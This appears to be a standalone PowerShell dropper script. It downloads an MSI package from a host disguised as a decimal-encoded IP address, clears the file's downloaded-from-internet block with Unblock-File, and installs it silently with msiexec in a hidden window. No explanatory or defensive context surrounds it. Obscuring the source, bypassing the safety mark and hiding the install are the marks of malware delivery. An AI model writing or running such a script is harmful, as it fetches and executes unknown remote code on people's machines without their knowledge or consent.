$package = Join-Path $env:TEMP '78adca7b-410c-4d36-94a9-4f6ac3a058bc.msi'
Invoke-WebRequest -Uri 'http://3221226001/app/setup.msi' -OutFile $package
Unblock-File -Path $package
Start-Process msiexec.exe -ArgumentList "/i `"$package`" /qn /norestart" -WindowStyle Hidden -Wait
